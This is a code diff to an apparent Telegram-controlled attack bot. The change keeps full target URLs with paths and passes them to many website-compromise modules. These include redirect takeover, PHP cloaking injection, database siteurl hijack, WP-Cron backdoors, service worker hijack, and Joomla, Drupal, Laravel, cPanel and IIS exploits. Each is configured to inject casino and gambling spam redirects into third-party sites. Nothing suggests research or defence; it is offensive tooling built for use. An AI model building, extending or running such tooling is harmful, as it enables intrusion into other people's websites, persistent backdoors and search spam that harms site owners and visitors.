@@ -434,6 +434,8 @@ interface ConversationState {
   pendingAction?: "awaiting_attack_method" | "awaiting_attack_confirm" | "awaiting_domain" | "awaiting_batch_confirm";
   /** Domain being discussed */
   targetDomain?: string;
+  /** Full target URL including path (e.g. https://example.com/about/) — used when user specifies a URL with path */
+  targetUrl?: string;
   /** Method being discussed */
   attackMethod?: string;
   /** Pending domain (for batch or single) */
@@ -504,13 +506,24 @@ async function handleWithConversationState(chatId: number, text: string): Promis
     const match = text.match(pattern);
     if (match) {
       const rest = match[1].trim();
-      // Extract domain from the rest of the text
+      // Extract full URL (with path) and domain separately
+      const fullUrlMatch = rest.match(/(https?:\/\/[a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.[a-zA-Z]{2,}(?:\/[^\s]*)?)/);
       const domainMatch = rest.match(/(?:https?:\/\/)?([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.[a-zA-Z]{2,})/);
       if (domainMatch) {
         const domain = domainMatch[1];
+        // Preserve full URL with path if user provided one (e.g. https://example.com/about/)
+        const fullTargetUrl = fullUrlMatch ? fullUrlMatch[1] : undefined;
+        // Also check for bare domain with path like "example.com/about/"
+        const bareDomainWithPath = rest.match(/([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.[a-zA-Z]{2,}\/[^\s]+)/);
+        const targetUrl = fullTargetUrl || (bareDomainWithPath ? `https://${bareDomainWithPath[1]}` : undefined);
+        
         const config = getTelegramConfig();
         if (config) {
-          console.log(`[TelegramAI] Direct attack shortcut: ${domain}`);
+          console.log(`[TelegramAI] Direct attack shortcut: domain=${domain}, targetUrl=${targetUrl || 'none'}`);
+          // Store targetUrl in conversation state so callback handlers can use it
+          if (targetUrl) {
+            setConversationState(chatId, { targetDomain: domain, targetUrl });
+          }
           try {
             const sent = await sendAttackTypeKeyboard(config, chatId, domain);
             if (sent) {
@@ -531,9 +544,18 @@ async function handleWithConversationState(chatId: number, text: string): Promis
   const bareDomainMatch = text.trim().match(/^(?:https?:\/\/)?([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.[a-zA-Z]{2,})(?:\/\S*)?$/);
   if (bareDomainMatch && !lowerText.startsWith('/')) {
     const domain = bareDomainMatch[1];
+    // Check if user provided a path (e.g. "example.com/about/" or "https://example.com/about/")
+    const inputText = text.trim();
+    const hasPath = inputText.match(/(?:https?:\/\/)?[a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.[a-zA-Z]{2,}(\/\S+)/);
+    const targetUrl = hasPath ? (inputText.startsWith('http') ? inputText : `https://${inputText}`) : undefined;
+    
     const config = getTelegramConfig();
     if (config) {
-      console.log(`[TelegramAI] Bare domain shortcut: ${domain}`);
+      console.log(`[TelegramAI] Bare domain shortcut: domain=${domain}, targetUrl=${targetUrl || 'none'}`);
+      // Store targetUrl in conversation state if path was provided
+      if (targetUrl) {
+        setConversationState(chatId, { targetDomain: domain, targetUrl });
+      }
       try {
         const sent = await sendAttackTypeKeyboard(config, chatId, domain);
         if (sent) {
@@ -1412,7 +1434,12 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
 
       case "attack_website": {
         const method = args.method || "full_chain";
-        const targetDomain = args.targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+        // Extract domain (root) for display/logging, but preserve full URL for actual attack
+        const rawTargetInput = args.targetDomain || "";
+        const targetDomain = rawTargetInput.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+        // Preserve full URL with path if user provided one (e.g. https://example.com/about/)
+        const hasTargetPath = rawTargetInput.replace(/^https?:\/\//, "").includes("/");
+        const attackTargetUrl = hasTargetPath ? (rawTargetInput.startsWith("http") ? rawTargetInput : `https://${rawTargetInput}`) : undefined;
         const methodEta = getMethodEta(method);
         
         // Guard: reject raw IP addresses — not real domains
@@ -1465,7 +1492,8 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         }
         
         // Launch attack with real-time narration (non-blocking)
-        executeAttackWithProgress(config, attackChatId, targetDomain, actualMethod).catch(err => {
+        // Pass attackTargetUrl to preserve path (e.g. /about/) if user specified one
+        executeAttackWithProgress(config, attackChatId, targetDomain, actualMethod, attackTargetUrl).catch(err => {
           console.error(`[TelegramAI] Narrated attack error: ${err.message}`);
         });
         
@@ -4205,8 +4233,11 @@ function translatePipelineEvent(phase: string, detail: string): string | null {
   return null;
 }
 
-async function executeAttackWithProgress(config: TelegramConfig, chatId: number, domain: string, method: string): Promise<void> {
-  console.log(`[TelegramAI] executeAttackWithProgress called: domain=${domain}, method=${method}`);
+async function executeAttackWithProgress(config: TelegramConfig, chatId: number, domain: string, method: string, targetUrl?: string): Promise<void> {
+  // targetUrl = full URL with path (e.g. https://example.com/about/) if user specified one
+  // If not provided, falls back to https://${domain}
+  const effectiveTargetUrl = targetUrl || `https://${domain}`;
+  console.log(`[TelegramAI] executeAttackWithProgress called: domain=${domain}, method=${method}, targetUrl=${effectiveTargetUrl}`);
   const eta = getMethodEta(method);
   const attackId = `${domain}:${method}:${Date.now()}`;
   const stopKeyboard = {
@@ -4581,7 +4612,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       
       const takeoverOutcome = await runStepWithTimeout("redirect_takeover", narrator, async () => {
         const { executeRedirectTakeover } = await import("./redirect-takeover");
-        return executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+        return executeRedirectTakeover({ targetUrl: effectiveTargetUrl, ourRedirectUrl: redirectUrl });
       }, { heartbeatLabel: "Redirect Takeover" });
       
       let results: Array<{ success: boolean; method: string; detail?: string; injectedUrl?: string }> = [];
@@ -4990,7 +5021,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             let lastPhaseForProgress = "";
             const pipelineResult = await runUnifiedAttackPipeline(
               {
-                targetUrl: `https://${domain}`,
+                targetUrl: effectiveTargetUrl,
                 redirectUrl,
                 seoKeywords: ["casino", "gambling", "slots"],
                 enableCloaking: true,
@@ -5069,7 +5100,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── PHP Cloaking Injection ──
             const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
             const injResult = await executePhpInjectionAttack({
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               targetLanguages: ["th", "vi"],
               brandName: "casino",
@@ -5112,7 +5143,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // Redirect Takeover
             const takeoverStep = await narrator.addStep("🔓 Redirect Takeover (6 วิธี)");
             const { executeRedirectTakeover } = await import("./redirect-takeover");
-            const hijackResults = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+            const hijackResults = await executeRedirectTakeover({ targetUrl: effectiveTargetUrl, ourRedirectUrl: redirectUrl });
             const hijackSucceeded = hijackResults.filter(r => r.success);
             for (const r of hijackResults) {
               await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
@@ -5159,7 +5190,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             
             // Build config from vuln scan data
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5197,7 +5228,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const dbStep = await narrator.addStep("🗄️ DB siteurl/home Hijack");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5232,7 +5263,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const gtmStep = await narrator.addStep("🏷️ GTM Redirect Injection");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5266,7 +5297,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const prependStep = await narrator.addStep("⚙️ auto_prepend .user.ini Inject");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5297,7 +5328,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           } else if (methodId === "redirect") {
             // ── Redirect Takeover (direct, no creds) ──
             const { executeRedirectTakeover } = await import("./redirect-takeover");
-            const rtResults = await executeRedirectTakeover({ targetUrl: `https://${domain}`, ourRedirectUrl: redirectUrl });
+            const rtResults = await executeRedirectTakeover({ targetUrl: effectiveTargetUrl, ourRedirectUrl: redirectUrl });
             const rtSucceeded = rtResults.filter(r => r.success);
             for (const r of rtResults) {
               await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
@@ -5316,7 +5347,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── Joomla Exploits ──
             await narrator.addStep("🔴 Joomla API Disclosure (CVE-2023-23752)");
             const { joomlaApiDisclosure, joomlaTemplateInject, joomlaComFieldsSqli } = await import("./non-wp-exploits");
-            const joomlaConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "joomla", discoveredCredentials: [] as any[] };
+            const joomlaConfig: any = { targetUrl: effectiveTargetUrl, redirectUrl, cms: "joomla", discoveredCredentials: [] as any[] };
             
             const apiResult = await joomlaApiDisclosure(joomlaConfig);
             await narrator.completeLastStep(apiResult.success ? "done" : "failed");
@@ -5354,7 +5385,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── Drupal Exploits ──
             await narrator.addStep("🔵 Drupalgeddon 2 (CVE-2018-7600)");
             const { drupalgeddon2, drupalThemeInject } = await import("./non-wp-exploits");
-            const drupalConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "drupal", discoveredCredentials: [] as any[] };
+            const drupalConfig: any = { targetUrl: effectiveTargetUrl, redirectUrl, cms: "drupal", discoveredCredentials: [] as any[] };
             
             const dg2Result = await drupalgeddon2(drupalConfig);
             await narrator.completeLastStep(dg2Result.success ? "done" : "failed");
@@ -5381,7 +5412,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── cPanel Full Control ──
             await narrator.addStep("🖥️ cPanel File Manager API");
             const { cpanelFileManager, cpanelMysqlApi, cpanelZoneEditor } = await import("./non-wp-exploits");
-            const cpConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: vulnScanResult?.cms?.type || "unknown", discoveredCredentials: [] as any[] };
+            const cpConfig: any = { targetUrl: effectiveTargetUrl, redirectUrl, cms: vulnScanResult?.cms?.type || "unknown", discoveredCredentials: [] as any[] };
             
             const fmResult = await cpanelFileManager(cpConfig);
             await narrator.completeLastStep(fmResult.success ? "done" : "failed");
@@ -5418,7 +5449,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── IIS/ASP.NET Exploits ──
             await narrator.addStep("🪟 web.config Inject + ASPX Upload");
             const { webConfigInject, iisShortnameScan } = await import("./non-wp-exploits");
-            const iisConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "iis", discoveredCredentials: [] as any[] };
+            const iisConfig: any = { targetUrl: effectiveTargetUrl, redirectUrl, cms: "iis", discoveredCredentials: [] as any[] };
             
             const wcResult = await webConfigInject(iisConfig);
             await narrator.completeLastStep(wcResult.success ? "done" : "failed");
@@ -5438,7 +5469,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── Open Redirect Chain ──
             await narrator.addStep("🔗 สแกนหา Open Redirect endpoints");
             const { openRedirectChain } = await import("./non-wp-exploits");
-            const orConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: vulnScanResult?.cms?.type || "unknown" };
+            const orConfig: any = { targetUrl: effectiveTargetUrl, redirectUrl, cms: vulnScanResult?.cms?.type || "unknown" };
             
             const orResult = await openRedirectChain(orConfig);
             await narrator.completeLastStep(orResult.success ? "done" : "failed");
@@ -5457,7 +5488,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const cronStep = await narrator.addStep("⏰ WP-Cron Backdoor (self-healing)");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5491,7 +5522,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const widgetStep = await narrator.addStep("🧱 Widget/Sidebar JS Inject");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5525,7 +5556,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const wpcodeStep = await narrator.addStep("📝 WPCode/IHAF Plugin Abuse");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5559,7 +5590,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             const swStep = await narrator.addStep("🛡️ Service Worker Hijack");
             
             const shelllessConfig: import("./shellless-attack-engine").ShelllessConfig = {
-              targetUrl: `https://${domain}`,
+              targetUrl: effectiveTargetUrl,
               redirectUrl,
               seoKeywords: ["casino", "gambling", "slots"],
               cmsType: vulnScanResult?.cms?.type || undefined,
@@ -5591,7 +5622,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             // ── Laravel Redirect Inject ──
             await narrator.addStep("🟥 Laravel .env + Ignition RCE");
             const { laravelRedirectInject } = await import("./non-wp-exploits");
-            const laravelConfig: any = { targetUrl: `https://${domain}`, redirectUrl, cms: "laravel", discoveredCredentials: [] as any[] };
+            const laravelConfig: any = { targetUrl: effectiveTargetUrl, redirectUrl, cms: "laravel", discoveredCredentials: [] as any[] };
             
             const lrResult = await laravelRedirectInject(laravelConfig);
             await narrator.completeLastStep(lrResult.success ? "done" : "failed");
@@ -5788,7 +5819,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
                 const pipelineResult = await runUnifiedAttackPipeline(
                   {
-                    targetUrl: `https://${domain}`,
+                    targetUrl: effectiveTargetUrl,
                     redirectUrl,
                     seoKeywords: ["casino", "gambling", "slots"],
                     enableCloaking: true,
@@ -5827,7 +5858,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
                 const retryResult = await runUnifiedAttackPipeline(
                   {
-                    targetUrl: `https://${domain}`,
+                    targetUrl: effectiveTargetUrl,
                     redirectUrl,
                     seoKeywords: ["casino", "gambling", "slots"],
                     enableCloaking: true,
@@ -6441,7 +6472,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const injectionOutcome = await runStepWithTimeout("cloaking_inject", narrator, async () => {
         const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
         return executePhpInjectionAttack({
-          targetUrl: `https://${domain}`,
+          targetUrl: effectiveTargetUrl,
           redirectUrl,
           targetLanguages: ["th", "vi"],
           brandName: "casino",
@@ -7860,8 +7891,12 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
           const parts = data.split(":");
           const domain = parts[1];
           const method = parts[2];
+          // Retrieve targetUrl from conversation state (preserves path like /about/)
+          const convState = getConversationState(chatId);
+          const storedTargetUrl = (convState?.targetDomain === domain && convState?.targetUrl) ? convState.targetUrl : undefined;
+          console.log(`[TelegramAI] atk_confirm: domain=${domain}, method=${method}, targetUrl=${storedTargetUrl || 'default'}`);
           // Run attack with real-time progress (non-blocking)
-          executeAttackWithProgress(config, chatId, domain, method).catch(err => {
+          executeAttackWithProgress(config, chatId, domain, method, storedTargetUrl).catch(err => {
             console.error(`[TelegramAI] Attack execution error: ${err.message}`);
           });
           return;
@@ -7873,10 +7908,13 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
           const parts = data.split(":");
           const domain = parts[1];
           const mode = parts[2];
+          // Retrieve targetUrl from conversation state (preserves path like /about/)
+          const convState2 = getConversationState(chatId);
+          const storedTargetUrl2 = (convState2?.targetDomain === domain && convState2?.targetUrl) ? convState2.targetUrl : undefined;
           // Launch attack directly with recommended mode
           await sendTelegramReply(config, chatId,
             `\u2694\ufe0f \u0e40\u0e23\u0e34\u0e48\u0e21\u0e42\u0e08\u0e21\u0e15\u0e35 ${domain} \u0e14\u0e49\u0e27\u0e22\u0e42\u0e2b\u0e21\u0e14 ${mode}...`);
-          executeAttackWithProgress(config, chatId, domain, mode).catch(err => {
+          executeAttackWithProgress(config, chatId, domain, mode, storedTargetUrl2).catch(err => {
             console.error(`[TelegramAI] atk_mode attack error: ${err.message}`);
           });
           return;
